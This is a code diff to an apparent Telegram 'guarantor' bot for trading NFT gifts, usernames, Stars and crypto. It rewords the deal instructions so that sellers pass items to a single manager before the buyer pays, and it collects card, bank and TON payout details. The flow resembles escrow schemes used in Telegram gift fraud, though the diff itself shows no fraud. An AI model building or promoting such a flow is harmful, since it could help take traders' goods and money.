@@ -107,14 +107,14 @@ Etgt = E["target"];     Estck= E["sticker"]
 # ─── Типы сделок ──────────────────────────────────────────────────────────────
 TNAMES_RU = {
     "nft":      f"{Enft} NFT подарок",
-    "username": f"{Eu} NFT Username",
+    "username": f"{Eu} Username",
     "stars":    f"{Est} Звёзды Telegram",
     "crypto":   f"{Edm} Крипта (TON/USDT)",
     "premium":  f"{Egm} Telegram Premium",
 }
 TNAMES_EN = {
     "nft":      f"{Enft} NFT Gift",
-    "username": f"{Eu} NFT Username",
+    "username": f"{Eu} Username",
     "stars":    f"{Est} Telegram Stars",
     "crypto":   f"{Edm} Crypto (TON/USDT)",
     "premium":  f"{Egm} Telegram Premium",
@@ -221,7 +221,7 @@ def gen_deal_id(db):
 
 def add_log(db, event, deal_id=None, uid=None, username=None, extra=""):
     if "logs" not in db: db["logs"]=[]
-    db["logs"].append({"time":datetime.now().strftime("%d.%m.%Y %H:%M"),"event":event,
+    db["logs"].append({"time":datetime.now().strftime("%d.%m.%Y %H:%M:%S"),"event":event,
         "deal_id":deal_id or "","uid":str(uid) if uid else "","username":username or "","extra":extra})
     if len(db["logs"])>500: db["logs"]=db["logs"][-500:]
 
@@ -250,7 +250,8 @@ async def send_log_msg(context, db, entry):
             tmpl=log_templates[event_key]
             text=tmpl.replace("{user}",ud or uid_d).replace("{deal}",deal.strip()).replace("{extra}",entry.get("extra","")).replace("{time}",entry["time"])
         else:
-            text=f"<b>{entry['time']}</b> {entry['event']}{deal}\n{ud} {uid_d}{ex}"
+            deal_str=f"\n🔖 Сделка #{entry['deal_id']}" if entry.get("deal_id") else ""
+            text=f"🕐 <b>{entry['time']}</b>\n📌 {entry['event']}{deal_str}\n{ud} {uid_d}{ex}"
         # Баннер для события
         b=log_banners.get(event_key,{})
         bp=b.get("photo"); bv=b.get("video"); bg=b.get("gif")
@@ -474,15 +475,15 @@ def build_deal_text(deal_id, d, creator_tag, partner_tag, lang, joined=False):
         if joined:
             # Инструкция для присоединившегося участника
             if creator_role=="seller":
-                # Присоединился покупатель — должен оплатить
+                # Создатель продавец — присоединился покупатель
                 joined_instr=R(ru,
-                    f"Сначала переведите оплату покупатель переводит первым по реквизитам ниже, затем нажмите «Я оплатил». После подтверждения продавец {partner_tag} передаст товар менеджеру {MANAGER_TAG}.",
-                    f"Buyer pays first — send payment using the details below, then press «I paid». After confirmation seller {partner_tag} will transfer the item to manager {MANAGER_TAG}.")
+                    f"Переведите оплату по реквизитам ниже и нажмите «Я оплатил». После подтверждения продавец {partner_tag} передаст вам товар через менеджера {MANAGER_TAG}.",
+                    f"Send payment using the details below and press «I paid». After confirmation seller {partner_tag} will send the item via manager {MANAGER_TAG}.")
             else:
-                # Присоединился продавец — должен передать товар
+                # Создатель покупатель — присоединился продавец
                 joined_instr=R(ru,
-                    f"Передайте товар менеджеру {MANAGER_TAG}. После подтверждения оплаты от покупателя {partner_tag} сделка будет завершена.",
-                    f"Transfer the item to manager {MANAGER_TAG}. After payment confirmation from buyer {partner_tag} the deal will be completed.")
+                    f"Передайте товар менеджеру {MANAGER_TAG} — покупатель {partner_tag} уже ожидает и оплатит после получения товара.",
+                    f"Transfer the item to manager {MANAGER_TAG} — buyer {partner_tag} is waiting and will pay after receiving the item.")
             lines.append(f"\n<blockquote>{joined_instr}</blockquote>")
 
             # Реквизиты только для выбранной валюты
@@ -492,7 +493,7 @@ def build_deal_text(deal_id, d, creator_tag, partner_tag, lang, joined=False):
                 bank=card_bank(lang)
                 lines += [
                     f"<b>{Ecrd} {'СБП / Карта' if ru else 'Card / Phone'} {bank}:</b>",
-                    f"<blockquote>{R(ru,'Номер','Number')}: <code>{CARD_NUM}</code>\n{R(ru,'Получатель','Recipient')}: {CARD_NAME}</blockquote>",
+                    f"<blockquote>{R(ru,'Номер','Number')}: <code>{CARD_NUM}</code>\n{R(ru,'Получатель','Recipient')}: {CARD_NAME}\n{R(ru,'Банк','Bank')}: {bank}</blockquote>",
                 ]
             elif cur=="TON":
                 lines += [
@@ -786,14 +787,6 @@ async def on_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"{Epen} <b>{R(ru,'Создать сделку','Create Deal')}\n\n{R(ru,'Кто вы в этой сделке?','What is your role?')}</b>",
                 parse_mode="HTML",reply_markup=role_kb(lang)); return
 
-        if d=="role_buyer_skip":
-            ud["creator_role"]="buyer"
-            try: await q.message.delete()
-            except: pass
-            await update.effective_chat.send_message(
-                f"{Epen} <b>{R(ru,'Выберите тип сделки:','Choose deal type:')}</b>",
-                parse_mode="HTML",reply_markup=types_kb(lang)); return
-
         if d in ("role_buyer","role_seller"):
             role="buyer" if d=="role_buyer" else "seller"
             # Только покупатель обязан иметь реквизиты (продавец пропускает)
@@ -805,7 +798,6 @@ async def on_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
                         [InlineKeyboardButton(R(ru,f"Карта / Телефон {bank}",f"Card / Phone {bank}"),callback_data="req_edit_card_buyer",icon_custom_emoji_id="5902056028513505203")],
                         [InlineKeyboardButton("TON",callback_data="req_edit_ton_buyer",icon_custom_emoji_id="6039709013090768335")],
                         [InlineKeyboardButton(R(ru,"Звёзды","Stars"),callback_data="req_edit_stars_buyer",icon_custom_emoji_id="5893034681636491040")],
-                        [InlineKeyboardButton(R(ru,"Пропустить","Skip"),callback_data="role_buyer_skip",icon_custom_emoji_id="5316815985099946114")],
                         [InlineKeyboardButton(R(ru,"Назад","Back"),icon_custom_emoji_id="5316815985099946114",callback_data="menu_deal")],
                     ])
                     no_req_text=R(ru,
@@ -813,6 +805,21 @@ async def on_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
                         "Add requisites to receive payment after the deal:\n(or skip)")
                     await update.effective_chat.send_message(
                         f"{Ewrn} <b>{no_req_text}</b>",parse_mode="HTML",reply_markup=kb)
+                    ud["creator_role"]=role; return
+            # Проверка реквизитов для продавца
+            if role=="seller":
+                db2=load_db(); u2=get_user(db2,uid); reqs2=u2.get("requisites",{})
+                if not any(reqs2.get(f) for f in ("card","ton","stars")):
+                    bank2=card_bank(lang)
+                    kb2=InlineKeyboardMarkup([
+                        [InlineKeyboardButton(R(ru,f"Карта / Телефон {bank2}",f"Card / Phone {bank2}"),callback_data="req_edit_card_buyer",icon_custom_emoji_id="5902056028513505203")],
+                        [InlineKeyboardButton("TON",callback_data="req_edit_ton_buyer",icon_custom_emoji_id="6039709013090768335")],
+                        [InlineKeyboardButton(R(ru,"Звёзды","Stars"),callback_data="req_edit_stars_buyer",icon_custom_emoji_id="5893034681636491040")],
+                        [InlineKeyboardButton(R(ru,"Назад","Back"),icon_custom_emoji_id="5316815985099946114",callback_data="menu_deal")],
+                    ])
+                    await update.effective_chat.send_message(
+                        f"{Ewrn} <b>{R(ru,'Добавьте реквизиты для получения оплаты:','Add requisites to receive payment:')}</b>",
+                        parse_mode="HTML",reply_markup=kb2)
                     ud["creator_role"]=role; return
             ud["creator_role"]=role
             try: await q.message.delete()
@@ -890,7 +897,7 @@ async def on_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 ud["req_step"]=field; ud["req_after_buyer_deal"]=True
                 bank=card_bank(lang)
                 prompts={
-                    "card": f"💳 <b>{R(ru,f'Карта / Номер телефона {bank}',f'Card / Phone Number {bank}')}</b>\n\n<blockquote>{R(ru,'Пример:','Example:')}\n<code>+79041751408</code></blockquote>",
+                    "card": f"{Ecrd} <b>{R(ru,f'Карта / Номер телефона {bank}',f'Card / Phone Number {bank}')}</b>\n\n<blockquote>{R(ru,'Пример:','Example:')}\n<code>+79041751408</code></blockquote>",
                     "ton":  f"{Edm} <b>TON</b>\n\n<blockquote>{R(ru,'Пример:','Example:')}\n<code>UQDxxx...xxx</code></blockquote>",
                     "stars":f"{Est} <b>{R(ru,'Звёзды','Stars')}</b>\n\n<blockquote>{R(ru,'Пример:','Example:')}\n<code>@username</code></blockquote>",
                 }
@@ -898,7 +905,7 @@ async def on_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     InlineKeyboardMarkup([[InlineKeyboardButton(R(ru,"Назад","Back"),icon_custom_emoji_id="5316815985099946114",callback_data="menu_deal")]]),section="profile"); return
             field=raw; bank=card_bank(lang)
             prompts={
-                "card": f"💳 <b>{R(ru,f'Карта / Номер телефона {bank}',f'Card / Phone Number {bank}')}</b>\n\n<blockquote>{R(ru,'Пример:','Example:')}\n<code>+79041751408</code></blockquote>",
+                "card": f"{Ecrd} <b>{R(ru,f'Карта / Номер телефона {bank}',f'Card / Phone Number {bank}')}</b>\n\n<blockquote>{R(ru,'Пример:','Example:')}\n<code>+79041751408</code></blockquote>",
                 "ton":  f"{Edm} <b>TON</b>\n\n<blockquote>{R(ru,'Пример:','Example:')}\n<code>UQDxxx...xxx</code></blockquote>",
                 "stars":f"{Est} <b>{R(ru,'Звёзды','Stars')}</b>\n\n<blockquote>{R(ru,'Пример:','Example:')}\n<code>@username</code></blockquote>",
             }
@@ -920,7 +927,7 @@ async def on_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parts=d[9:].split("_",1); field=parts[0]; deal_id=parts[1] if len(parts)>1 else ""
             ud["req_step"]=field; ud["req_for_deal"]=deal_id; bank=card_bank(lang)
             prompts={
-                "card": f"💳 <b>{R(ru,f'Карта / Телефон {bank}',f'Card / Phone {bank}')}</b>\n\n<blockquote>{R(ru,'Пример:','Example:')}\n<code>+79041751408</code></blockquote>",
+                "card": f"{Ecrd} <b>{R(ru,f'Карта / Телефон {bank}',f'Card / Phone {bank}')}</b>\n\n<blockquote>{R(ru,'Пример:','Example:')}\n<code>+79041751408</code></blockquote>",
                 "ton":  f"{Edm} <b>TON</b>\n\n<blockquote>{R(ru,'Пример:','Example:')}\n<code>UQDxxx...xxx</code></blockquote>",
                 "stars":f"{Est} <b>{R(ru,'Звёзды','Stars')}</b>\n\n<blockquote>{R(ru,'Пример:','Example:')}\n<code>@username</code></blockquote>",
             }
@@ -1119,11 +1126,28 @@ async def on_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
             field=ud["req_step"]; db=load_db(); u=get_user(db,uid)
             err=None
             if field=="card":
-                r=validate_card(text)
-                if r is None: err=R(ru,
-                    "Введите номер телефона или карты.\n\n<b>Пример:</b>\n<code>+79041751408</code>",
-                    "Enter phone or card number.\n\n<b>Example:</b>\n<code>+79041751408</code>")
-                else: text=r
+                if ud.get("card_step")=="bank":
+                    # Второй шаг — банк
+                    if not text.strip():
+                        await update.message.reply_text(f"{Ewrn} <b>{R(ru,'Введите название банка:','Enter bank name:')}</b>",parse_mode="HTML"); return
+                    ud["card_bank_name"]=text.strip()
+                    # Сохраняем карту + банк вместе
+                    card_val=ud.pop("card_pending","")
+                    bank_val=ud.pop("card_bank_name","")
+                    text=f"{card_val}|{bank_val}"
+                    ud.pop("card_step",None)
+                else:
+                    r=validate_card(text)
+                    if r is None:
+                        err=R(ru,
+                            "Введите номер телефона или карты.\n\n<b>Пример:</b>\n<code>+79041751408</code>",
+                            "Enter phone or card number.\n\n<b>Example:</b>\n<code>+79041751408</code>")
+                    else:
+                        # Первый шаг — запросить банк
+                        ud["card_pending"]=r; ud["card_step"]="bank"
+                        await update.message.reply_text(
+                            f"{Ecrd} <b>{R(ru,'Введите название банка:','Enter bank name:')}</b>\n\n<blockquote>{R(ru,'Пример:','Example:')} Сбербанк, ВТБ, Тинькофф...</blockquote>",
+                            parse_mode="HTML"); return
             elif field=="ton":
                 if not validate_ton_address(text):
                     err=R(ru,"Введите TON адрес.\n\n<b>Пример:</b>\n<code>UQDxxx...xxx</code>",
@@ -1274,11 +1298,7 @@ async def on_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await send_step(f"{Est} <b>{R(ru,'Введите сумму звёзд:','Enter stars amount:')}</b>")
             elif dtype=="crypto":
                 ud["step"]="cry_currency"
-                await send_step(f"{Edm} <b>{R(ru,'Выберите валюту:','Choose currency:')}</b>",
-                    InlineKeyboardMarkup([[
-                        InlineKeyboardButton("TON",callback_data="cry_ton",icon_custom_emoji_id="6039802097916974085"),
-                        InlineKeyboardButton("USDT",callback_data="cry_usd",icon_custom_emoji_id="6039641775377748623")
-                    ]]))
+                await send_step(f"{Edm} <b>{R(ru,'Выберите валюту:','Choose currency:')}</b>",cur_kb(lang))
             elif dtype=="premium":
                 ud["step"]="prem_period"
                 await send_step(f"✈️ <b>Telegram Premium\n\n{R(ru,'Выберите срок:','Choose period:')}</b>",
@@ -1654,10 +1674,14 @@ async def show_req(update, context):
         card=reqs.get("card"); ton=reqs.get("ton"); stars=reqs.get("stars")
         bank=card_bank(lang)
 
-        lines=[f"{Ereq} <b>{R(ru,'Мои реквизиты','My Requisites')}</b>\n"]
-        lines.append(f"{Ecrd} <b>{R(ru,f'Карта / Телефон {bank}',f'Card / Phone {bank}')}:</b>")
+        lines=[f"{Ecwn} <b>{R(ru,'Мои реквизиты','My Requisites')}</b>\n"]
+        lines.append(f"{Ecrd} <b>{R(ru,f'Карта / Телефон',f'Card / Phone')}:</b>")
         if card:
-            lines.append(f"<blockquote>{R(ru,'Номер','Number')}: <code>{card}</code>\n{R(ru,'Банк','Bank')}: {bank}</blockquote>")
+            if "|" in card:
+                card_num,card_bnk=card.split("|",1)
+            else:
+                card_num=card; card_bnk=bank
+            lines.append(f"<blockquote>{R(ru,'Номер','Number')}: <code>{card_num}</code>\n{R(ru,'Банк','Bank')}: {card_bnk}</blockquote>")
         else:
             lines.append(f"<blockquote>{R(ru,'Не добавлена','Not added')}</blockquote>")
         lines.append(f"\n{Eton} <b>TON:</b>")
